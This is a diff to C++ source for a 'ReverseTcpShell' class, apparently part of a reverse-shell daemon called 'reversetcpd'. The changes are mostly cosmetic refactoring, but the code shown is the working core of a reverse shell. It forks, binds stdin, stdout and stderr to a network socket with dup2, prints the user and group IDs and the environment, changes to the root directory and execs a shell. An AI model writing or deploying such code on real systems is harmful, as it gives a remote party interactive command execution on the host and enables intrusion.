@@ -34,18 +34,23 @@ ReverseTcpShell::~ReverseTcpShell()
 
 bool ReverseTcpShell::Start()
 {
+    const UnixSocket::native_handle_type nativeChildSocket = m_childSocket.native_handle();
     const size_t pid = fork(); 
     if (0 == pid)
     {
         //! Child.
 
+        //! ---------------------------------------------------------
+        //! Close original standard IO file handles here
+        //! and redirect them to the child socket.
         //! Dup2 used to close original standard IO file handles
         //! and redirect them to the child socket.
-        dup2(m_childSocket.native_handle(), STDIN_FILENO);
-        dup2(m_childSocket.native_handle(), STDOUT_FILENO);
-        dup2(m_childSocket.native_handle(), STDERR_FILENO);
+        dup2(nativeChildSocket, STDIN_FILENO);
+        dup2(nativeChildSocket, STDOUT_FILENO);
+        dup2(nativeChildSocket, STDERR_FILENO);
 
-        //! Initialize the shell variables.
+        //! ---------------------------------------------------------
+        //! Initialize the shell variables and environment here.
         std::vector<char> shellEnv;
         std::vector<char> pathEnv;
 
@@ -59,23 +64,29 @@ bool ReverseTcpShell::Start()
         std::copy(SHELL.begin(), SHELL.end(), std::back_inserter(shellPath));
         char* argv[] = { shellPath.data(), NULL };
 
+        //! Print the environment.
         std::cout << "uid=" << getuid() << " gid=" << getgid() << '\n';
         std::cout << std::string(shellEnv.data(), shellEnv.size()) << '\n';
         std::cout << std::string(pathEnv.data(), pathEnv.size()) << '\n';
         std::cout << std::string(shellPath.data(), shellPath.size()) << '\n';
-
+        
+        //! ---------------------------------------------------------
+        //! Change directory to root
         chdir("/");
-
-        //! Execve to load the shell process and execute it.
+        
+        //! ---------------------------------------------------------
+        //! Load the shell process and execute it here.
         execve(SHELL.c_str(), argv, env);
-
+    
+        //! ---------------------------------------------------------
+        //! Should not be reachable if shell start is successful.
         std::cerr << "reversetcpd: Errno=" << errno << " - " << strerror(errno) << '\n';
         exit(errno);
     }
     else if (-1 == pid)
     {
         //! Error during fork in the parent.
-        std::cerr << "reversetcpd: Error during fork, errno=" << errno << " - " << strerror(errno);
+        std::cerr << "reversetcpd: Error during fork, errno=" << errno << " - " << strerror(errno) << '\n';
 
         m_parentSocket.cancel();
         m_childSocket.cancel();
